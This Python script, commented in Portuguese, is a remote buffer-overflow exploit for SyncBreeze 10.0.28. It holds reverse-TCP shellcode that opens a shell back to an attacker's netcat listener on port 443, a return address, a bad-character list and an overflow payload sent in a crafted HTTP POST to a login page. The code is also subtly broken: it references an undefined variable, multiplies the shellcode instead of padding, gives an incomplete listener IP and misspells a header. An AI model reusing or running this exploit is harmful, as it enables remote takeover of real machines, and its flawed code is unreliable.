#!/usr/bin/python
# Exploit para SyncBreeze 10.0.28 Remote BufferOverflow
# Testado em um windows 10
import socket

# endereço de retorno
# 0x10090c83
# bad chars: \x00\x0a\x25\x26\x2b\x3d
# windows/shell_reverse_tcp lhost=192.168.32 lport=443 exitfunc=thread
# nc -vlp 443
shellcode = ("\xba\xa4\xab\xad\xa0\xd9\xe8\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x12\x83\xee\xfc\x03\xf2\xa5\x4f\x55\x06\x51\x0d"
"\x96\xf6\xa2\x72\x1e\x13\x93\xb2\x44\x50\x84\x02\x0e\x34\x29"
"\xe8\x42\xac\xba\x9c\x4a\xc3\x0b\x2a\xad\xea\x8c\x07\x8d\x6d"
"\x0f\x5a\xc2\x4d\x2e\x95\x17\x8c\x77\xc8\xda\xdc\x20\x86\x49"
"\xf0\x45\xd2\x51\x7b\x15\xf2\xd1\x98\xee\xf5\xf0\x0f\x64\xac"
"\xd2\xae\xa9\xc4\x5a\xa8\xae\xe1\x15\x43\x04\x9d\xa7\x85\x54"
"\x5e\x0b\xe8\x58\xad\x55\x2d\x5e\x4e\x20\x47\x9c\xf3\x33\x9c"
"\xde\x2f\xb1\x06\x78\xbb\x61\xe2\x78\x68\xf7\x61\x76\xc5\x73"
"\x2d\x9b\xd8\x50\x46\xa7\x51\x57\x88\x21\x21\x7c\x0c\x69\xf1"
"\x1d\x15\xd7\x54\x21\x45\xb8\x09\x87\x0e\x55\x5d\xba\x4d\x32"
"\x92\xf7\x6d\xc2\xbc\x80\x1e\xf0\x63\x3b\x88\xb8\xec\xe5\x4f"
"\xbe\xc6\x52\xdf\x41\xe9\xa2\xf6\x85\xbd\xf2\x60\x2f\xbe\x98"
"\x70\xd0\x6b\x0e\x20\x7e\xc4\xef\x90\x3e\xb4\x87\xfa\xb0\xeb"
"\xb8\x05\x1b\x84\x53\xfc\xcc\x6b\x0b\xfe\x2c\x04\x4e\xfe\x2d"
"\x6f\xc7\x18\x47\x9f\x8e\xb3\xf0\x06\x8b\x4f\x60\xc6\x01\x2a"
"\xa2\x4c\xa6\xcb\x6d\xa5\xc3\xdf\x1a\x45\x9e\xbd\x8d\x5a\x34"
"\xa9\x52\xc8\xd3\x29\x1c\xf1\x4b\x7e\x49\xc7\x85\xea\x67\x7e"
"\x3c\x08\x7a\xe6\x07\x88\xa1\xdb\x86\x11\x27\x67\xad\x01\xf1"
"\x68\xe9\x75\xad\x3e\xa7\x23\x0b\xe9\x09\x9d\xc5\x46\xc0\x49"
"\x93\xa4\xd3\x0f\x9c\xe0\xa5\xef\x2d\x5d\xf0\x10\x81\x09\xf4"
"\x69\xff\xa9\xfb\xa0\xbb\xca\x19\x60\xb6\x62\x84\xe1\x7b\xef"
"\x37\xdc\xb8\x16\xb4\xd4\x40\xed\xa4\x9d\x45\xa9\x62\x4e\x34"
"\xa2\x06\x70\xeb\xc3\x02")

payload = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + shellcode * (1200-784)

# calculando tamanho do espaço para o shellcode em ESP
#payload = "A" * 780 + "\x83\x0c\x09\x10" + "C" * (1200-784)

# content-lenght: 20 do header + 1000 dod buffer
tam = len(payload) + 20

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.5\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Referer: http://192.168.0.58/login\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Lenght: "+str(tam)+"\r\n"
request+="DNT: 1\r\n"
request+="Connection: close\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username="+dados+"&password=A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.58",80))
s.send(request)
